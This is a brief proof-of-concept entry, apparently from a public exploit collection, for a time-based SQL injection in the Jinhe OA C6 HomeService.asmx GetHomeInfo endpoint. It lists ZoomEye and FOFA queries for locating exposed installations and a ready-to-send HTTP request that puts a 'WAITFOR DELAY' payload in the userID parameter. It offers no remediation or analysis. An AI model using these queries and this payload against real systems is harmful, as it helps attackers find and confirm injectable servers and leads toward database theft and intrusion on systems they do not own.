## 金和OA_HomeService.asmxSQL注入

## 语法
```
zoomeye：
app:"JingHe OA C6"

fofa：
app="金和网络-金和OA"
```

## poc
```
GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```
![image](https://github.com/wy876/POC/assets/139549762/e4f93bf5-416a-4ff2-87b6-9a3fb26d048e)

![image](https://github.com/wy876/POC/assets/139549762/ee9c3d29-096d-48b8-a037-c5371867c033)
